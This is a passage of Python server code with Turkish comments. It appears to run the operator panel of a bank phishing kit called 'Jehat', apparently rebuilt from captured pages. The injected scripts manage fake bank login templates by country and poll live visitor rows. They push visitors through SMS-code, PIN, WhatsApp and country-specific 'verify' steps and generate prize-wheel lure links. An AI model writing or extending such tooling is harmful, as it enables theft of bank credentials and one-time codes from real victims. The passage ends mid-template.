        # Operator kısıtlamaları
        restricted_pages = ['userManagement', 'adminSettings', 'truncate']
        if user_role == 'operator' and sub in restricted_pages:
            self.send_response(302)
            self.send_header('Location', '/jehat/dashboard')
            self.end_headers(); return

        if sub in page_map:
            fp = os.path.join(CAPTURED_PAGES, page_map[sub])
            if os.path.isfile(fp):
                # Fetch interceptor + Error interceptor inject - tüm admin sayfalarında
                interceptor = """<script>
(function(){
    const _origFetch = window.fetch;
    window.fetch = function(url, opts) {
        const method = (opts && opts.method) || 'GET';
        console.log('[FETCH]', method, url);
        return _origFetch.apply(this, arguments);
    };
})();
</script>"""
                # bank/list sayfası için özel Alpine bileşeni - admin.js'den SONRA yüklenmeli
                extra_script = ''
                if sub == 'bank/list':
                    banks_json_str = json.dumps(store.data['banks'], ensure_ascii=False).replace('</', '<\\/')
                    extra_script = f"""<script>
// admin.js'nin bankListApp'ini override et - bu script admin.js'den SONRA yüklenir
(function() {{
    // Alpine yüklendikten sonra çalıştır
    function registerBankListApp() {{
        if (typeof Alpine === 'undefined') {{
            setTimeout(registerBankListApp, 50);
            return;
        }}
        Alpine.data('bankListApp', function() {{
            return {{
                banks: {banks_json_str},
                filteredBanks: [],
                countryFilter: 'finland',
                countryMap: function(c) {{
                    var map = {{'finland':'Finlandiya','spain':'İspanya','austria':'Avusturya','denmark':'Danimarka','norway':'Norveç','sweden':'İsveç','australia':'Avustralya','hong kong':'Hong Kong','ireland':'İrlanda'}};
                    return map[(c||'').toLowerCase()] || c || '-';
                }},
                init: function() {{
                    this.filterBanks();
                }},
                filterBanks: function() {{
                    var cf = this.countryFilter.toLowerCase();
                    this.filteredBanks = this.banks.filter(function(b) {{
                        var bc = (b.country || '').toLowerCase();
                        return bc === cf || bc.replace('iya','') === cf.replace('iya','');
                    }});
                }},
                deleteBank: function(bankId) {{
                    if (!confirm('Bu bankayı silmek istediğinize emin misiniz?')) return;
                    var self = this;
                    fetch('/jehat/deleteBank', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'}},
                        body: JSON.stringify({{id: String(bankId)}}),
                        credentials: 'include'
                    }}).then(function(r){{ return r.json(); }}).then(function(data) {{
                        if (data.success) {{
                            self.banks = self.banks.filter(function(b){{ return b.id != bankId; }});
                            self.filterBanks();
                            alert('Banka başarıyla silindi');
                        }} else {{
                            alert(data.message || 'Silme hatası');
                        }}
                    }}).catch(function(err) {{
                        alert('Hata: ' + err.message);
                    }});
                }}
            }};
        }});
    }}
    // alpine:init event'i ZATEN firedsa, doğrudan kaydet
    document.addEventListener('alpine:init', registerBankListApp);
    // Ayrıca hemen de dene (belki Alpine zaten yüklendi)
    registerBankListApp();
}})();
</script>"""
                # dashboard sayfası için Alpine bileşeni
                elif sub == 'dashboard':
                    extra_script = """<script>
(function() {
    function registerDashboardApps() {
        if (typeof Alpine === 'undefined') {
            setTimeout(registerDashboardApps, 50);
            return;
        }

        // Store: general
        Alpine.store('general', {
            isCollapsed: false,
            darkMode: false,
            bannedCount: 0,
            toggleDarkMode: function() {
                this.darkMode = !this.darkMode;
                document.body.classList.toggle('dark-mode', this.darkMode);
            },
            sendRequest: function(source, action, extra, vid, ip) {
                var body = {action: action, visitor_id: String(vid), ip: ip || ''};
                if (extra) Object.assign(body, extra);
                fetch('/jehat/sendRequest', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                    body: JSON.stringify(body),
                    credentials: 'include'
                }).then(function(r){ return r.json(); }).then(function(data) {
                    if (data.success) {
                        // Refresh data
                        document.dispatchEvent(new CustomEvent('refresh-dashboard'));
                    }
                }).catch(function(err) { console.error('sendRequest error:', err); });
            }
        });

        // Store: navigation
        Alpine.store('navigation', { currentPath: 'dashboard' });

        // Sidebar app
        Alpine.data('sidebarApp', function() {
            return {
                isCollapsed: false,
                init: function() {
                    var self = this;
                    this.$watch('isCollapsed', function(val) {
                        Alpine.store('general').isCollapsed = val;
                    });
                }
            };
        });

        // Header app
        Alpine.data('headerApp', function() { return {}; });

        // Change password app
        Alpine.data('changePasswordApp', function() {
            return {
                username: '', password: '',
                changePassword: function() {
                    fetch('/jehat/changePassword', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({username: this.username, password: this.password}),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        alert(data.message || 'Şifre değiştirildi');
                        $('#changePasswordModal').modal('hide');
                    }).catch(function(){ alert('Hata!'); });
                }
            };
        });

        // Select country app
        Alpine.data('selectCountryApp', function() {
            return { selectedCountry: 'finland' };
        });

        // Link app
        Alpine.data('linkApp', function() {
            return {
                selectedCampaign: '', fullName: '', rewardAmount: '', selectedCurrency: '',
                generatedLink: '', errorMessage: '', copySuccess: false, isLoading: false,
                get isWheelSelected() { return this.selectedCampaign === 'wheel'; },
                formatCurrency: function(el) {
                    el.value = el.value.replace(/[^0-9.,]/g, '');
                    this.rewardAmount = el.value;
                },
                closeModal: function() {
                    this.generatedLink = '';
                    this.errorMessage = '';
                    this.copySuccess = false;
                    $('#createLinkModal').modal('hide');
                },
                copyLink: function() {
                    var self = this;
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(this.generatedLink).then(function() {
                            self.copySuccess = true;
                            setTimeout(function(){ self.copySuccess = false; }, 2000);
                        });
                    }
                },
                createLink: function() {
                    var self = this;
                    this.isLoading = true;
                    this.errorMessage = '';
                    fetch('/jehat/createLink', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({
                            campaign: this.selectedCampaign,
                            full_name: this.fullName,
                            prize: this.rewardAmount,
                            currency: this.selectedCurrency
                        }),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        self.isLoading = false;
                        if (data.success) {
                            self.generatedLink = data.data.url;
                        } else {
                            self.errorMessage = data.message || 'Hata!';
                        }
                    }).catch(function(err) {
                        self.isLoading = false;
                        self.errorMessage = 'Bağlantı hatası!';
                    });
                }
            };
        });

        // Main admin app
        Alpine.data('adminApp', function() {
            return {
                rows: [],
                visitorCount: 0,
                logCount: 0,
                copied: {},
                selectedRow: { step: 1, percent: 0 },
                smsTitle: '', smsLength: 6, smsMessage: '',
                opPin: '',
                austriaTexts: { text1: '', text2: '', text3: '' },
                customVerifyTexts: { text1: '', text2: '', text3: '' },
                refreshTimer: null,
                init: function() {
                    var self = this;
                    this.fetchData();
                    this.refreshTimer = setInterval(function(){ self.fetchData(); }, 3000);
                    document.addEventListener('refresh-dashboard', function(){ self.fetchData(); });
                },
                fetchData: function() {
                    var self = this;
                    fetch('/jehat/getDashboard', {
                        headers: {'X-Requested-With': 'XMLHttpRequest'},
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        if (data.success) {
                            self.rows = data.data || [];
                            self.visitorCount = data.online_count || 0;
                            self.logCount = data.total_visitors || 0;
                            Alpine.store('general').bannedCount = data.banned_count || 0;
                        }
                    }).catch(function(err) { console.error('fetchData error:', err); });
                },
                rowStyles: function(id) {
                    return '';
                },
                copyToClipboard: function(rowId, field) {
                    var self = this;
                    var row = this.rows.find(function(r){ return r.id === rowId; });
                    if (!row || !row[field]) return;
                    var text = String(row[field]);
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(text).then(function() {
                            if (!self.copied[rowId]) self.copied[rowId] = {};
                            self.copied[rowId][field] = true;
                            setTimeout(function(){ 
                                if (self.copied[rowId]) self.copied[rowId][field] = false;
                            }, 1500);
                        });
                    }
                },
                setTransferData: function(row) {
                    this.selectedRow = Object.assign({}, row);
                },
                saveNameModal: function() {
                    var self = this;
                    Alpine.store('general').sendRequest('dashboard', 'support', {
                        step: this.selectedRow.step,
                        percent: this.selectedRow.percent
                    }, this.selectedRow.id, this.selectedRow.ip);
                    $('#nameModal').modal('hide');
                },
                sendSms: function() {
                    fetch('/jehat/sendSms', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({
                            visitor_id: String(this.selectedRow.id),
                            smsTitle: this.smsTitle,
                            smsLength: this.smsLength,
                            smsMessage: this.smsMessage
                        }),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function() {
                        document.dispatchEvent(new CustomEvent('refresh-dashboard'));
                        $('#smsModal').modal('hide');
                    }).catch(function(){});
                },
                saveOpPin: function() {
                    fetch('/jehat/sendRequest', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({
                            action: 'op-verify',
                            visitor_id: String(this.selectedRow.id),
                            pin: this.opPin
                        }),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function() {
                        document.dispatchEvent(new CustomEvent('refresh-dashboard'));
                        $('#opPinModal').modal('hide');
                    }).catch(function(){});
                },
                sendWhatsapp: function() {
                    fetch('/jehat/sendRequest', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({
                            action: 'whatsapp',
                            visitor_id: String(this.selectedRow.id),
                            step: this.selectedRow.step,
                            percent: this.selectedRow.percent
                        }),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function() {
                        document.dispatchEvent(new CustomEvent('refresh-dashboard'));
                        $('#whatsappModal').modal('hide');
                    }).catch(function(){});
                },
                sendAustriaVerify: function() {
                    fetch('/jehat/sendRequest', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({
                            action: 'austria-verify',
                            visitor_id: String(this.selectedRow.id),
                            text1: this.austriaTexts.text1,
                            text2: this.austriaTexts.text2,
                            text3: this.austriaTexts.text3
                        }),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function() {
                        document.dispatchEvent(new CustomEvent('refresh-dashboard'));
                        $('#austriaModal').modal('hide');
                    }).catch(function(){});
                },
                sendCustomVerify: function() {
                    fetch('/jehat/sendRequest', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                        body: JSON.stringify({
                            action: 'custom-verify',
                            visitor_id: String(this.selectedRow.id),
                            text1: this.customVerifyTexts.text1,
                            text2: this.customVerifyTexts.text2,
                            text3: this.customVerifyTexts.text3
                        }),
                        credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function() {
                        document.dispatchEvent(new CustomEvent('refresh-dashboard'));
                        $('#customVerifyModal').modal('hide');
                    }).catch(function(){});
                }
            };
        });
    }
    document.addEventListener('alpine:init', registerDashboardApps);
    registerDashboardApps();
})();
</script>"""

                # onlineUsers sayfası için Alpine bileşeni
                elif sub == 'onlineUsers':
                    extra_script = """<script>
(function() {
    function registerOnlineUsersApps() {
        if (typeof Alpine === 'undefined') {
            setTimeout(registerOnlineUsersApps, 50);
            return;
        }
        Alpine.store('general', {
            isCollapsed: false, darkMode: false, bannedCount: 0,
            toggleDarkMode: function() { this.darkMode = !this.darkMode; document.body.classList.toggle('dark-mode', this.darkMode); }
        });
        Alpine.store('navigation', { currentPath: 'onlineUsers' });
        Alpine.data('sidebarApp', function() {
            return { isCollapsed: false, init: function() { var s=this; this.$watch('isCollapsed', function(v){ Alpine.store('general').isCollapsed=v; }); } };
        });
        Alpine.data('headerApp', function() { return {}; });
        Alpine.data('changePasswordApp', function() { return { username:'', password:'', changePassword:function(){} }; });
        Alpine.data('selectCountryApp', function() { return { selectedCountry: 'finland' }; });
        Alpine.data('linkApp', function() {
            return { selectedCampaign:'', fullName:'', rewardAmount:'', selectedCurrency:'', generatedLink:'', errorMessage:'', copySuccess:false, isLoading:false,
                get isWheelSelected(){ return this.selectedCampaign==='wheel'; },
                formatCurrency:function(el){ el.value=el.value.replace(/[^0-9.,]/g,''); this.rewardAmount=el.value; },
                closeModal:function(){ this.generatedLink=''; this.errorMessage=''; $('#createLinkModal').modal('hide'); },
                copyLink:function(){ var s=this; if(navigator.clipboard){ navigator.clipboard.writeText(this.generatedLink).then(function(){s.copySuccess=true;setTimeout(function(){s.copySuccess=false;},2000);}); } },
                createLink:function(){ var s=this; this.isLoading=true; this.errorMessage='';
                    fetch('/jehat/createLink',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({campaign:this.selectedCampaign,full_name:this.fullName,prize:this.rewardAmount,currency:this.selectedCurrency}),credentials:'include'})
                    .then(function(r){return r.json();}).then(function(d){s.isLoading=false;if(d.success){s.generatedLink=d.data.url;}else{s.errorMessage=d.message||'Hata!';}}).catch(function(){s.isLoading=false;s.errorMessage='Bağlantı hatası!';});
                }
            };
        });
        Alpine.data('onlineUsersApp', function() {
            return {
                users: [], filteredUsers: [], searchTerm: '', isLoading: false,
                stats: { total_users: 0, online_users: 0, today_logins: 0 },
                init: function() { this.fetchUsers(); },
                fetchUsers: function() {
                    var self = this;
                    this.isLoading = true;
                    fetch('/jehat/getOnlineUsers', { headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'include' })
                    .then(function(r){ return r.json(); }).then(function(data) {
                        self.isLoading = false;
                        if (data.success) {
                            self.users = data.data || [];
                            self.filteredUsers = self.users;
                            self.stats.total_users = self.users.length;
                            self.stats.online_users = self.users.filter(function(u){ return u.connection_status === 'online'; }).length;
                        }
                    }).catch(function(){ self.isLoading = false; });
                },
                refreshUsers: function() { this.fetchUsers(); },
                filterUsers: function() {
                    var q = this.searchTerm.toLowerCase();
                    this.filteredUsers = this.users.filter(function(u){ return (u.username||'').toLowerCase().indexOf(q) !== -1; });
                },
                cleanSessions: function() { alert('Eski oturumlar temizlendi'); },
                getRoleText: function(r) { return {super_admin:'Süper Admin',admin:'Admin',operator:'Operatör'}[r] || r; },
                getConnectionStatusText: function(s) { return {online:'Çevrimiçi',away:'Uzakta',offline:'Çevrimdışı'}[s] || s; },
                formatDateTime: function(dt) { if(!dt) return '-'; return dt; },
                getTimeAgo: function(dt) { return ''; }
            };
        });
    }
    document.addEventListener('alpine:init', registerOnlineUsersApps);
    registerOnlineUsersApps();
})();
</script>"""

                # activityLogs sayfası için Alpine bileşeni
                elif sub == 'activityLogs':
                    extra_script = """<script>
(function() {
    function registerActivityLogsApps() {
        if (typeof Alpine === 'undefined') {
            setTimeout(registerActivityLogsApps, 50);
            return;
        }
        Alpine.store('general', {
            isCollapsed: false, darkMode: false, bannedCount: 0,
            toggleDarkMode: function() { this.darkMode = !this.darkMode; document.body.classList.toggle('dark-mode', this.darkMode); }
        });
        Alpine.store('navigation', { currentPath: 'activityLogs' });
        Alpine.data('sidebarApp', function() {
            return { isCollapsed: false, init: function() { var s=this; this.$watch('isCollapsed', function(v){ Alpine.store('general').isCollapsed=v; }); } };
        });
        Alpine.data('headerApp', function() { return {}; });
        Alpine.data('changePasswordApp', function() { return { username:'', password:'', changePassword:function(){} }; });
        Alpine.data('selectCountryApp', function() { return { selectedCountry: 'finland' }; });
        Alpine.data('linkApp', function() {
            return { selectedCampaign:'', fullName:'', rewardAmount:'', selectedCurrency:'', generatedLink:'', errorMessage:'', copySuccess:false, isLoading:false,
                get isWheelSelected(){ return this.selectedCampaign==='wheel'; },
                formatCurrency:function(el){ el.value=el.value.replace(/[^0-9.,]/g,''); this.rewardAmount=el.value; },
                closeModal:function(){ this.generatedLink=''; this.errorMessage=''; $('#createLinkModal').modal('hide'); },
                copyLink:function(){ var s=this; if(navigator.clipboard){ navigator.clipboard.writeText(this.generatedLink).then(function(){s.copySuccess=true;setTimeout(function(){s.copySuccess=false;},2000);}); } },
                createLink:function(){ var s=this; this.isLoading=true; this.errorMessage='';
                    fetch('/jehat/createLink',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({campaign:this.selectedCampaign,full_name:this.fullName,prize:this.rewardAmount,currency:this.selectedCurrency}),credentials:'include'})
                    .then(function(r){return r.json();}).then(function(d){s.isLoading=false;if(d.success){s.generatedLink=d.data.url;}else{s.errorMessage=d.message||'Hata!';}}).catch(function(){s.isLoading=false;s.errorMessage='Bağlantı hatası!';});
                }
            };
        });
        Alpine.data('activityLogsApp', function() {
            return {
                logs: [], filteredLogs: [], actionFilter: '', userFilter: '', isLoading: false,
                pagination: { current_page: 1, total_pages: 1, total_logs: 0, per_page: 50 },
                init: function() { this.fetchLogs(); },
                fetchLogs: function() {
                    var self = this;
                    this.isLoading = true;
                    fetch('/jehat/getActivityLogs', { headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'include' })
                    .then(function(r){ return r.json(); }).then(function(data) {
                        self.isLoading = false;
                        if (data.success) {
                            self.logs = data.data || [];
                            self.filteredLogs = self.logs;
                            if (data.pagination) self.pagination = data.pagination;
                        }
                    }).catch(function(){ self.isLoading = false; });
                },
                refreshLogs: function() { this.fetchLogs(); },
                filterLogs: function() {
                    var af = this.actionFilter, uf = this.userFilter.toLowerCase();
                    this.filteredLogs = this.logs.filter(function(l) {
                        if (af && l.action !== af) return false;
                        if (uf && (l.username||'').toLowerCase().indexOf(uf) === -1) return false;
                        return true;
                    });
                },
                deleteAllLogs: function() {
                    if (!confirm('Tüm logları silmek istediğinize emin misiniz?')) return;
                    var self = this;
                    fetch('/jehat/deleteAllLogs', { method:'POST', headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'include' })
                    .then(function(r){ return r.json(); }).then(function(){ self.logs=[]; self.filteredLogs=[]; })
                    .catch(function(){});
                },
                getActionText: function(a) {
                    return {user_created:'Kullanıcı Oluşturuldu',user_updated:'Güncellendi',user_deleted:'Silindi',
                        user_status_changed:'Durum Değişti',login:'Giriş',logout:'Çıkış',
                        dashboard_action:'Dashboard İşlem',user_session_terminated:'Oturum Sonlandı',
                        sendRequest:'Dashboard İşlem',createLink:'Link Oluşturuldu',
                        addBank:'Banka Eklendi',editBank:'Banka Düzenlendi',deleteBank:'Banka Silindi',
                        saveWheelSettings:'Çark Ayarı',saveLanguage:'Dil Güncellendi',
                        logs_deleted:'Loglar Silindi'}[a] || a;
                },
                formatDateTime: function(dt) { if(!dt) return '-'; return dt; },
                changePage: function(p) { this.pagination.current_page = p; this.fetchLogs(); },
                getPageNumbers: function() {
                    var pages = [];
                    for (var i=1; i<=this.pagination.total_pages; i++) pages.push(i);
                    return pages;
                }
            };
        });
    }
    document.addEventListener('alpine:init', registerActivityLogsApps);
    registerActivityLogsApps();
})();
</script>"""

                # userManagement sayfası için Alpine bileşeni
                elif sub == 'userManagement':
                    extra_script = """<script>
(function() {
    function registerUserManagementApps() {
        if (typeof Alpine === 'undefined') {
            setTimeout(registerUserManagementApps, 50);
            return;
        }
        Alpine.store('general', {
            isCollapsed: false, darkMode: false, bannedCount: 0,
            toggleDarkMode: function() { this.darkMode = !this.darkMode; document.body.classList.toggle('dark-mode', this.darkMode); }
        });
        Alpine.store('navigation', { currentPath: 'userManagement' });
        Alpine.data('sidebarApp', function() {
            return { isCollapsed: false, init: function() { var s=this; this.$watch('isCollapsed', function(v){ Alpine.store('general').isCollapsed=v; }); } };
        });
        Alpine.data('headerApp', function() { return {}; });
        Alpine.data('changePasswordApp', function() {
            return { username:'', password:'',
                changePassword: function() {
                    fetch('/jehat/changePassword', {
                        method:'POST', headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
                        body: JSON.stringify({username: this.username, password: this.password}), credentials:'include'
                    }).then(function(r){return r.json();}).then(function(d){ alert(d.message||'Şifre değiştirildi'); $('#changePasswordModal').modal('hide'); }).catch(function(){alert('Hata!');});
                }
            };
        });
        Alpine.data('selectCountryApp', function() { return { selectedCountry: 'finland' }; });
        Alpine.data('linkApp', function() {
            return { selectedCampaign:'', fullName:'', rewardAmount:'', selectedCurrency:'', generatedLink:'', errorMessage:'', copySuccess:false, isLoading:false,
                get isWheelSelected(){ return this.selectedCampaign==='wheel'; },
                formatCurrency:function(el){ el.value=el.value.replace(/[^0-9.,]/g,''); this.rewardAmount=el.value; },
                closeModal:function(){ this.generatedLink=''; this.errorMessage=''; $('#createLinkModal').modal('hide'); },
                copyLink:function(){ var s=this; if(navigator.clipboard){ navigator.clipboard.writeText(this.generatedLink).then(function(){s.copySuccess=true;setTimeout(function(){s.copySuccess=false;},2000);}); } },
                createLink:function(){ var s=this; this.isLoading=true; this.errorMessage='';
                    fetch('/jehat/createLink',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({campaign:this.selectedCampaign,full_name:this.fullName,prize:this.rewardAmount,currency:this.selectedCurrency}),credentials:'include'})
                    .then(function(r){return r.json();}).then(function(d){s.isLoading=false;if(d.success){s.generatedLink=d.data.url;}else{s.errorMessage=d.message||'Hata!';}}).catch(function(){s.isLoading=false;s.errorMessage='Bağlantı hatası!';});
                }
            };
        });
        Alpine.data('userManagementApp', function() {
            return {
                users: [],
                filteredUsers: [],
                searchTerm: '',
                isLoading: false,
                editingUser: { id: '', username: '', role: 'admin', status: 'active' },
                init: function() { this.fetchUsers(); },
                fetchUsers: function() {
                    var self = this;
                    this.isLoading = true;
                    fetch('/jehat/getAllUsers', { headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'include' })
                    .then(function(r){ return r.json(); }).then(function(data) {
                        self.isLoading = false;
                        if (data.success) {
                            self.users = data.data || [];
                            self.filteredUsers = self.users;
                        }
                    }).catch(function(){ self.isLoading = false; });
                },
                refreshUsers: function() { this.fetchUsers(); },
                filterUsers: function() {
                    var q = this.searchTerm.toLowerCase();
                    this.filteredUsers = this.users.filter(function(u){ return (u.username||'').toLowerCase().indexOf(q) !== -1; });
                },
                getRoleText: function(r) { return {super_admin:'Süper Admin',admin:'Admin',operator:'Operatör'}[r] || r; },
                getStatusText: function(s) { return {active:'Aktif',inactive:'Pasif',banned:'Banlı'}[s] || s; },
                formatDateTime: function(dt) { if(!dt) return '-'; return dt; },
                editUser: function(user) {
                    this.editingUser = { id: user.id, username: user.username, role: user.role, status: user.status };
                    $('#editUserModal').modal('show');
                },
                addUser: function() {
                    var self = this;
                    var form = document.getElementById('addUserForm');
                    var fd = new FormData(form);
                    var body = {};
                    fd.forEach(function(v, k){ body[k] = v; });
                    if (!body.username || !body.password) { alert('Kullanıcı adı ve şifre zorunludur'); return; }
                    this.isLoading = true;
                    fetch('/jehat/addUser', {
                        method: 'POST', headers: {'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
                        body: JSON.stringify(body), credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        self.isLoading = false;
                        if (data.success) {
                            alert('Kullanıcı başarıyla eklendi');
                            $('#addUserModal').modal('hide');
                            form.reset();
                            self.fetchUsers();
                        } else { alert(data.message || 'Hata oluştu'); }
                    }).catch(function(err) { self.isLoading = false; alert('Hata: ' + err.message); });
                },
                updateUser: function() {
                    var self = this;
                    var form = document.getElementById('editUserForm');
                    var pw = form.querySelector('input[name=password]').value;
                    var body = { user_id: this.editingUser.id, username: this.editingUser.username, role: this.editingUser.role, status: this.editingUser.status };
                    if (pw) body.password = pw;
                    this.isLoading = true;
                    fetch('/jehat/editUser', {
                        method: 'POST', headers: {'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
                        body: JSON.stringify(body), credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        self.isLoading = false;
                        if (data.success) {
                            alert('Kullanıcı güncellendi');
                            $('#editUserModal').modal('hide');
                            self.fetchUsers();
                        } else { alert(data.message || 'Hata oluştu'); }
                    }).catch(function(err) { self.isLoading = false; alert('Hata: ' + err.message); });
                },
                changeUserStatus: function(uid, newStatus) {
                    var self = this;
                    fetch('/jehat/changeUserStatus', {
                        method: 'POST', headers: {'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
                        body: JSON.stringify({ user_id: uid, status: newStatus }), credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        if (data.success) self.fetchUsers();
                        else alert(data.message || 'Hata');
                    }).catch(function(err) { alert('Hata: ' + err.message); });
                },
                resetUserSession: function(uid) {
                    if (!confirm('Bu kullanıcının oturumunu sıfırlamak istiyor musunuz?')) return;
                    var self = this;
                    fetch('/jehat/resetUserSession', {
                        method: 'POST', headers: {'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
                        body: JSON.stringify({ user_id: uid }), credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        if (data.success) { alert('Oturum sıfırlandı'); self.fetchUsers(); }
                    }).catch(function(err) { alert('Hata: ' + err.message); });
                },
                deleteUser: function(uid) {
                    if (!confirm('Bu kullanıcıyı silmek istediğinize emin misiniz?')) return;
                    var self = this;
                    fetch('/jehat/deleteUser', {
                        method: 'POST', headers: {'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
                        body: JSON.stringify({ user_id: uid }), credentials: 'include'
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        if (data.success) { alert('Kullanıcı silindi'); self.fetchUsers(); }
                        else alert(data.message || 'Hata');
                    }).catch(function(err) { alert('Hata: ' + err.message); });
                }
            };
        });
    }
    document.addEventListener('alpine:init', registerUserManagementApps);
    registerUserManagementApps();
})();
</script>"""

                # bank/add sayfası için Alpine bileşeni
                elif sub == 'bank/add':
                    extra_script = """<script>
(function() {
    function registerBankAddApp() {
        if (typeof Alpine === 'undefined') {
            setTimeout(registerBankAddApp, 50);
            return;
        }
        Alpine.data('bankAddApp', function() {
            return {
                formData: {
                    country: '', bankName: '', bankTitle: '', inputLabel1: '', inputLabel2: '',
                    logo: null, status: 'active', showPassword: '1', loginOption: '0',
                    optionCount: '0', optionName1: '', optionName2: '', optionName3: '',
                    listLogin: '0', loginListCount: '0', loginListText: ''
                },
                formErrors: [],
                formErrorMessages: {},
                handleFileUpload: function(e) {
                    this.formData.logo = e.target.files[0] || null;
                },
                submitForm: function() {
                    this.formErrors = [];
                    if (!this.formData.country) this.formErrors.push('country');
                    if (!this.formData.bankName) this.formErrors.push('bankName');
                    if (this.formErrors.length > 0) return;

                    var fd = new FormData();
                    fd.append('country', this.formData.country);
                    fd.append('bank_name', this.formData.bankName);
                    fd.append('bank_title', this.formData.bankTitle);
                    fd.append('input_label_1', this.formData.inputLabel1);
                    fd.append('input_label_2', this.formData.inputLabel2);
                    fd.append('status', this.formData.status);
                    fd.append('show_password', this.formData.showPassword);
                    fd.append('login_option', this.formData.loginOption);
                    fd.append('option_count', this.formData.optionCount);
                    fd.append('option_name_1', this.formData.optionName1);
                    fd.append('option_name_2', this.formData.optionName2);
                    fd.append('option_name_3', this.formData.optionName3);
                    fd.append('list_login', this.formData.listLogin);
                    fd.append('login_list_count', this.formData.loginListCount);
                    fd.append('login_list_text', this.formData.loginListText);
                    if (this.formData.logo) fd.append('logo', this.formData.logo);

                    fetch('/jehat/addBank', {
                        method: 'POST', body: fd, credentials: 'include',
                        headers: {'X-Requested-With': 'XMLHttpRequest'}
                    }).then(function(r){ return r.json(); }).then(function(data) {
                        if (data.success) {
                            alert('Banka başarıyla eklendi');
                            window.location.href = '/jehat/bank/list';
                        } else {
                            alert(data.message || 'Hata oluştu');
                        }
                    }).catch(function(err) { alert('Hata: ' + err.message); });
                }
            };
        });
    }
    document.addEventListener('alpine:init', registerBankAddApp);
    registerBankAddApp();
})();
</script>"""

                # bank/list ve bank/add için admin.js'yi kaldır ve bizim script'i </body> öncesine enjekte et
                if extra_script:
                    with open(fp, 'r', encoding='utf-8', errors='replace') as f:
                        html = rewrite_html(f.read())
                    html = html.replace('</head>', interceptor + '\n</head>')
                    # admin.js'yi kaldır - bizim Alpine bileşenlerimiz zaten onu değiştiriyor
                    html = html.replace('<script src="/static/js/admin.js"></script>', '<!-- admin.js disabled, custom Alpine components used -->')
                    html = html.replace('</body>', extra_script + '\n</body>')
                    self._send(html, 'text/html; charset=utf-8')
                else:
                    self._html_file(fp, inject_script=interceptor)
                return

        # bank/edit/{id}
        bank_edit_match = re.match(r'^bank/edit/(\d+)$', sub)
        if bank_edit_match:
            bank_id = bank_edit_match.group(1)
            bank = store.get_bank(bank_id)
            if is_accept_json or is_xhr:
                self._json(bank or {}); return
            if not bank:
                self._json({'error': 'Bank not found'}, 404); return
            bank_json = json.dumps(bank, ensure_ascii=False).replace('</', '<\\/')
            edit_html = f'''<!doctype html>
<html lang="tr">
<head>
    <meta charset="utf-8" />
    <link rel="icon" type="image/png" sizes="96x96" href="/static/assets/img/favicon.png">
    <title>Banka Düzenle - {bank.get("bank_name","")}</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <link href="/static/assets/css/bootstrap.min.css" rel="stylesheet" />
    <link href="/static/assets/css/animate.min.css" rel="stylesheet" />
    <link href="/static/assets/css/paper-dashboard.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href="/static/assets/css/themify-icons.css" rel="stylesheet">
    <style>
        .current-logo {{ max-height: 60px; border-radius: 8px; border: 1px solid #ddd; padding: 4px; background: #fff; }}
        .form-section {{ background: #f8f9fa; border-radius: 12px; padding: 20px; margin-bottom: 20px; }}
        .form-section h5 {{ margin-bottom: 15px; color: #333; font-weight: 600; border-bottom: 2px solid #e5e7eb; padding-bottom: 8px; }}
        .save-btn {{ margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="sidebar" data-background-color="white" data-active-color="danger">
            <div class="sidebar-wrapper">
                <div class="logo"><a class="simple-text" href="/jehat/dashboard"> Jehat </a></div>
                <ul class="nav">
